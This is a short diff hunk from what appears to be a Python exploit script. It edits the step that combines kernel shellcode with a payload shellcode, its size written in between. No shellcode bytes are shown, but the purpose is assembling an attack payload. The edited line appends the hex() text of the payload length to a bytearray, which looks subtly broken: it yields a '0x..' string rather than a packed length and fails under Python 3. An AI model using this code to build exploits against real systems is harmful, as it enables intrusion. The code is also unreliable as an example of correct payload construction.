@@ -286,7 +286,7 @@ if __name__ == "__main__":
         modified_kernel_shellcode = bytearray(kernel_shellcode)
         
         #add PAYLOAD shellcode length after the kernel shellcode and write this value in hex 
-        modified_kernel_shellcode += payload_shellcode_size
+        modified_kernel_shellcode += hex(len(payload_shellcode))
         #add the shellcode after the shellcode size
         modified_kernel_shellcode += payload_shellcode
 
